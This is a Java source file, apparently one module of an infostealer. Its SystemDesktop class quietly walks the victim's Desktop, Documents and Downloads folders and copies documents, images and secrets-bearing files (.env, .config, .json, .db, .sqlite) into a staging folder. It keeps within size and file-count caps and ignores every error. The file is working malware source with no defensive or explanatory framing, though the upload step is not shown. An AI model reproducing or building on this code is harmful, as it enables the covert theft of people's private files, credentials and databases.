package itzgonza.hollyshit.impl.system;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import org.apache.commons.io.FileUtils;

import itzgonza.hollyshit.utils.utilities;

public class SystemDesktop extends utilities {
    
    private static final String[] TARGET_EXTENSIONS = {".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".jpg", ".png", ".env", ".config", ".json", ".db", ".sqlite"};
    private static final int MAX_FILE_SIZE = 2 * 1024 * 1024; // 2MB
    private static final int MAX_FILES = 50;
    private static final long MAX_TOTAL_SIZE = 50 * 1024 * 1024; // 50MB
    private long currentTotalSize = 0;
    
    public void initialize() throws Exception {
        String desktopPath = System.getProperty("user.home") + "/Desktop";
        File desktopDir = new File(desktopPath);
        
        if (desktopDir.exists()) {
            collectFiles(desktopDir.toPath(), new File(getFolder() + "/desktop/"));
        }
        
        // Also check Documents and Downloads
        String[] additionalPaths = {
            System.getProperty("user.home") + "/Documents",
            System.getProperty("user.home") + "/Downloads"
        };
        
        for (String additionalPath : additionalPaths) {
            if (currentTotalSize >= MAX_TOTAL_SIZE) break;
            File additionalDir = new File(additionalPath);
            if (additionalDir.exists()) {
                collectFiles(additionalDir.toPath(), new File(getFolder() + "/documents/"));
            }
        }
    }
    
    private void collectFiles(Path sourcePath, File destDir) throws Exception {
        if (!destDir.exists()) {
            destDir.mkdirs();
        }
        
        List<Path> files = Files.walk(sourcePath)
            .limit(200) // Look at more files to find matching ones
            .filter(Files::isRegularFile)
            .filter(path -> {
                String fileName = path.toString().toLowerCase();
                for (String ext : TARGET_EXTENSIONS) {
                    if (fileName.endsWith(ext)) return true;
                }
                return false;
            })
            .collect(java.util.stream.Collectors.toList());

        int count = 0;
        for (Path path : files) {
            if (count >= MAX_FILES || currentTotalSize >= MAX_TOTAL_SIZE) break;
            
            try {
                long size = Files.size(path);
                if (size <= MAX_FILE_SIZE && (currentTotalSize + size) <= MAX_TOTAL_SIZE) {
                    File destFile = new File(destDir, path.getFileName().toString());
                    FileUtils.copyFile(path.toFile(), destFile);
                    currentTotalSize += size;
                    count++;
                    content.add("desktop");
                }
            } catch (Exception ignored) {}
        }
    }
}